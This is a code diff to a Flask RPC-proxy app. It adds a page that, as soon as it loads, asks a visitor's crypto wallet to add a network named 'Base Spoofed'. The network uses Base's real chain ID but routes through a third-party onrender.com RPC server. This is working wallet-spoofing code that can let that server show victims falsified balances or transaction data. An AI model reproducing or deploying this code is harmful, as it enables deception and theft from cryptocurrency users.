@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string
+from flask import Flask, request, jsonify, render_template_string, redirect
 import requests
 import os
 from web3 import Web3
@@ -87,6 +87,45 @@ def handle_rpc():
 
     response = requests.post(BASE_RPC, json=data, headers={"Content-Type": "application/json"})
     return jsonify(response.json())
+
+@app.route('/add')
+def add_network_and_token():
+    return render_template_string("""
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Adding Network</title>
+        <script>
+            window.onload = async () => {
+                if (window.ethereum) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x2105',
+                                chainName: 'Base Spoofed',
+                                rpcUrls: ['https://stbl-rpc.onrender.com/rpc'],
+                                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                                blockExplorerUrls: ['https://basescan.org']
+                            }]
+                        });
+                        window.location.href = '/';
+                    } catch (error) {
+                        console.error('Network addition failed:', error);
+                    }
+                } else {
+                    alert('Please install a compatible wallet!');
+                }
+            };
+        </script>
+    </head>
+    <body>
+        <p>Adding network, please wait...</p>
+    </body>
+    </html>
+    """)
 
 @app.route('/')
 def add_token():
